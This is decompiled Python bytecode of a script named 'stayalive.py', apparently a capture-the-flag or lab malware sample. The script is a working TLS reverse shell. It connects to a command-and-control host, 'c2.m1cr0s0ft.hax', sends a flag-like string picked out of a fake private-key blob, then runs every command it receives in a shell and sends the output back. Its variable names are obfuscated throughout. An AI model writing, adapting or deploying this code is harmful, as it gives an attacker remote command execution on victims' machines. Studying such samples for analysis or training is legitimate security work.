# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.0 (default, Feb 25 2021, 22:10:10) 
# [GCC 8.4.0]
# Embedded file name: ./stayalive.py
# Compiled at: 2021-06-24 17:00:26
# Size of source mod 2**32: 2810 bytes
import socket, subprocess, os, ssl

def sczsz():
    global c2domain
    global c2port
    global s
    global ssls
    global tt
    try:
        tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421]
        c2domain = 'c2.m1cr0s0ft.hax'
        c2port = 64318
        s = socket.socket()
        ssls = ssl.wrap_socket(s, ssl_version=(ssl.PROTOCOL_TLSv1_2))
    except socket.error as error:
        try:
            try:
                print('socket creation error: ' + str(error))
            finally:
                error = None
                del error

        finally:
            error = None
            del error


def cscsz():
    try:
        ssls.connect((c2domain, c2port))
        xbx = '--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\t\t--- END PRIVATE KEY ---'
        ssls.send(str.encode(str(os.getcwd()) + '<' + ''.join([xbx[x] for x in tt]) + '>' + ' > '))
    except socket.error as error:
        try:
            try:
                print('socket conn error: ' + str(error))
            finally:
                error = None
                del error

        finally:
            error = None
            del error


def zszszs():
    while True:
        data = ssls.recv(1024)
        data = data.decode('utf-8').strip()
        print('received ' + data)
        if data[:2] == 'cd':
            os.chdir(data[3:])
            ssls.send(str.encode(str(os.getcwd()) + ' > '))
        else:
            if len(data) > 0:
                OO0000OO0O0000OO0 = subprocess.Popen(data, shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE), stdin=(subprocess.PIPE))
                O000000000O0OOO00 = OO0000OO0O0000OO0.stdout.read() + OO0000OO0O0000OO0.stderr.read()
                O0000O0O0OO0O0OO0 = str(O000000000O0OOO00.decode('utf-8'))
                ssls.send(str.encode(O0000O0O0OO0O0OO0 + str(os.getcwd()) + ' > '))
                if len(O0000O0O0OO0O0OO0.split('\n')) > 2:
                    OO0O00OOO00OO0OO0 = 2
                else:
                    OO0O00OOO00OO0OO0 = 0
                print('Sent: ' + OO0O00OOO00OO0OO0 * '\n' + O0000O0O0OO0O0OO0)
        if not data:
            break

    s.close()


def main():
    sczsz()
    cscsz()
    zszszs()


if __name__ == '__main__':
    main()
# okay decompiling stayalive.pyc
